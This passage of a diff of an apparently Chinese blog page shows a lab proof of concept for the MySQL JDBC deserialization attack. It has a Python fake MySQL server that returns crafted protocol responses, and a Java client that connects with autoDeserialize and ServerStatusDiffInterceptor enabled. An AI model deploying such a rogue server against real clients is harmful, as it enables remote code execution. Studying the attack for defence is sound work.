+            <span class="token keyword">if</span> <span class="token string">"show warnings"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+                payload <span class="token operator">=</span> <span class="token string">'01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'</span>
+                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    HOST <span class="token operator">=</span> <span class="token string">'0.0.0.0'</span>
+    PORT <span class="token operator">=</span> <span class="token number">3309</span>
+
+    sk <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+    <span class="token comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span>
+    sk<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
+    sk<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    sk<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start fake mysql server listening on &#123;&#125;:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    run<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>客户端（mysql-connector-java-8.0.12）</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> driver <span class="token operator">=</span> <span class="token string">"com.mysql.cj.jdbc.Driver"</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> <span class="token constant">DB_URL</span> <span class="token operator">=</span> <span class="token string">"jdbc:mysql://127.0.0.1:3309/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true"</span><span class="token punctuation">;</span> <span class="token comment">//8.x使用</span>
+        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>driver<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Connection</span> conn <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token constant">DB_URL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
